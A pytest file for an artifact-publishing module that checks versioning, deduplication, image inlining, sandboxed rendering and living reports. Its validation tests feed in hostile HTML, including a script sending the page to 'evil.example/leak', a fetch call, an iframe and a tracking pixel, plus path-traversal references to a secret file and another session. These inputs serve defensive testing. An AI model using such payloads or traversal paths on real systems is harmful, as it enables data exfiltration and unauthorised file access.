from __future__ import annotations

from pathlib import Path

import pytest

import dataclaw.config.paths as paths
from dataclaw_artifacts.compiler import compile_living_report
from dataclaw_artifacts.hooks import artifact_capture_hook
from dataclaw_artifacts.store import read_manifest_events, read_source
from dataclaw_artifacts.tools import list_artifacts, publish_artifact, read_artifact, report_note
from dataclaw_artifacts.wrapper import ARTIFACT_CSP, artifact_host_shell


@pytest.fixture(autouse=True)
def tmp_home(tmp_path, monkeypatch):
    monkeypatch.setattr(paths, "DATACLAW_HOME", tmp_path)
    (tmp_path / "workspaces").mkdir()
    return tmp_path


def _workspace(session_id: str) -> Path:
    root = paths.workspaces_dir() / session_id
    root.mkdir(parents=True, exist_ok=True)
    return root


@pytest.mark.asyncio
async def test_publish_revise_read_and_conflict_by_source_path():
    session_id = "s1"
    report = _workspace(session_id) / "reports" / "report.html"
    report.parent.mkdir(parents=True)
    report.write_text("<!doctype html><html><body><h1>First</h1></body></html>", encoding="utf-8")

    created = await publish_artifact(
        title="Quarterly Report",
        source_path="reports/report.html",
        session_id=session_id,
        label="initial",
    )

    assert created["success"] is True
    assert created["version"] == 1
    assert created["artifact_id"].startswith("art-")
    assert created["url"].endswith("?version=1")

    report.write_text("<!doctype html><html><body><h1>Second</h1></body></html>", encoding="utf-8")
    revised = await publish_artifact(
        title="Quarterly Report",
        source_path="reports/report.html",
        artifact_id=created["artifact_id"],
        base_version=1,
        session_id=session_id,
        label="revision",
    )

    assert revised["success"] is True
    assert revised["version"] == 2

    stale = await publish_artifact(
        title="Quarterly Report",
        source_path="reports/report.html",
        artifact_id=created["artifact_id"],
        base_version=1,
        session_id=session_id,
    )
    assert stale["success"] is False
    assert stale["error"]["code"] == "version_conflict"

    read = await read_artifact(artifact_id=created["artifact_id"], version=2)
    assert read["version"] == 2
    assert "Second" in read["html"]

    listed = await list_artifacts(session_id=session_id)
    assert listed["total"] == 1
    assert listed["artifacts"][0]["latest_version"] == 2


@pytest.mark.asyncio
async def test_identical_publish_dedupes_without_new_version():
    session_id = "s2"
    html = "<!doctype html><html><body><h1>Same</h1></body></html>"

    created = await publish_artifact(title="Same Report", html=html, session_id=session_id)
    repeated = await publish_artifact(
        title="Same Report",
        html=html,
        artifact_id=created["artifact_id"],
        session_id=session_id,
    )

    assert repeated["success"] is True
    assert repeated["version"] == 1
    assert repeated["deduped"] is True


@pytest.mark.asyncio
async def test_publish_validation_rejects_live_calls_and_hostile_tags():
    live = await publish_artifact(
        title="Bad",
        html="<html><body><script>fetch('/api/plans')</script></body></html>",
        session_id="s3",
    )
    assert live["success"] is False
    assert live["error"]["code"] == "live_data_call"

    framed = await publish_artifact(
        title="Bad Frame",
        html="<html><body><iframe src='x'></iframe></body></html>",
        session_id="s3",
    )
    assert framed["success"] is False
    assert framed["error"]["code"] == "forbidden_tag"

    remote = await publish_artifact(
        title="Remote",
        html="<html><body><img src='https://example.com/pixel.png'></body></html>",
        session_id="s3",
    )
    assert remote["success"] is False
    assert remote["error"]["code"] == "external_asset"

    navigation = await publish_artifact(
        title="Bad Navigation",
        html="<html><body><script>window.location='https://evil.example/leak'</script></body></html>",
        session_id="s3",
    )
    assert navigation["success"] is False
    assert navigation["error"]["code"] == "live_data_call"


@pytest.mark.asyncio
async def test_publish_inlines_relative_image_asset_and_writes_canonical_source():
    session_id = "s4"
    root = _workspace(session_id)
    (root / "reports").mkdir()
    (root / "reports" / "tiny.png").write_bytes(b"png-bytes")
    source = root / "reports" / "image-report.html"
    source.write_text("<html><body><img src='tiny.png'></body></html>", encoding="utf-8")

    result = await publish_artifact(
        title="Image Report",
        source_path="reports/image-report.html",
        session_id=session_id,
    )

    assert result["success"] is True
    stored = read_source(result["artifact_id"], 1)
    assert "data:image/png;base64," in stored
    assert "tiny.png" not in stored
    assert "data:image/png;base64," in source.read_text(encoding="utf-8")


@pytest.mark.asyncio
async def test_publish_rejects_relative_asset_escape_outside_workspace(tmp_home):
    session_id = "s4-escape"
    root = _workspace(session_id)
    report_dir = root / "reports"
    report_dir.mkdir()
    secret = tmp_home / "secret.txt"
    secret.write_text("SECRET-OUTSIDE-WORKSPACE", encoding="utf-8")
    rel_secret = Path("../../..") / secret.name
    source = report_dir / "escape-report.html"
    source.write_text(f"<html><body><img src='{rel_secret}'></body></html>", encoding="utf-8")

    result = await publish_artifact(
        title="Escape Report",
        source_path="reports/escape-report.html",
        session_id=session_id,
    )

    assert result["success"] is False
    assert result["error"]["code"] == "asset_outside_allowed_roots"


@pytest.mark.asyncio
async def test_publish_rejects_relative_asset_escape_to_other_session():
    session_id = "s4-source"
    root = _workspace(session_id)
    other = _workspace("s4-other")
    report_dir = root / "reports"
    report_dir.mkdir()
    (other / "other.png").write_bytes(b"not-for-this-session")
    source = report_dir / "cross-session-report.html"
    source.write_text("<html><body><img src='../../s4-other/other.png'></body></html>", encoding="utf-8")

    result = await publish_artifact(
        title="Cross Session Report",
        source_path="reports/cross-session-report.html",
        session_id=session_id,
    )

    assert result["success"] is False
    assert result["error"]["code"] == "asset_outside_allowed_roots"


def test_host_shell_uses_sandboxed_child_and_no_egress_csp():
    shell = artifact_host_shell(
        artifact_id="art-1234abcd",
        version=1,
        title="Test",
        source="<html><body><h1>Hello</h1></body></html>",
    )

    assert 'sandbox="allow-scripts"' in shell
    assert "frame.srcdoc = artifactSrcdoc" in shell
    assert "artifact_external_link" in shell
    assert "Blocked artifact navigation" in shell
    assert "connect-src 'none'" in ARTIFACT_CSP
    assert "navigate-to 'none'" in ARTIFACT_CSP
    assert "script-src 'unsafe-inline'" in ARTIFACT_CSP


@pytest.mark.asyncio
async def test_report_note_creates_live_report_and_compiles_pages():
    result = await report_note(
        page="decisions",
        markdown="Dropped the baseline after residual review.",
        plan_step_id="step-eda",
        session_id="session-living",
    )

    assert result["success"] is True
    assert result["url"].endswith("/living")

    events = read_manifest_events(result["artifact_id"])
    assert len(events) == 1
    assert events[0]["kind"] == "note"
    assert events[0]["plan_step_id"] == "step-eda"

    html = compile_living_report(result["artifact_id"])
    assert "DataClaw living report" in html
    assert "Dropped the baseline" in html
    assert "Decisions" in html
    assert "Log" in html

    listed = await list_artifacts(session_id="session-living")
    assert listed["artifacts"][0]["kind"] == "living_report"
    assert listed["artifacts"][0]["url"].endswith("/living")


@pytest.mark.asyncio
async def test_artifact_capture_hook_appends_publish_event_to_living_report():
    state = {
        "session_id": "session-hook",
        "project_id": "",
        "tool_results": [{
            "tool_name": "publish_artifact",
            "tool_input": {"title": "EDA Dashboard", "description": "Main dashboard"},
            "result": '{"success": true, "artifact_id": "art-1234abcd", "version": 2, "url": "/api/artifacts/art-1234abcd?version=2"}',
            "is_error": False,
        }],
    }

    updated = await artifact_capture_hook(state)
    assert updated is state

    listed = await list_artifacts(session_id="session-hook")
    living = listed["artifacts"][0]
    assert living["kind"] == "living_report"
    events = read_manifest_events(living["artifact_id"])
    assert events[0]["kind"] == "artifact_published"
    assert events[0]["payload"]["artifact_id"] == "art-1234abcd"
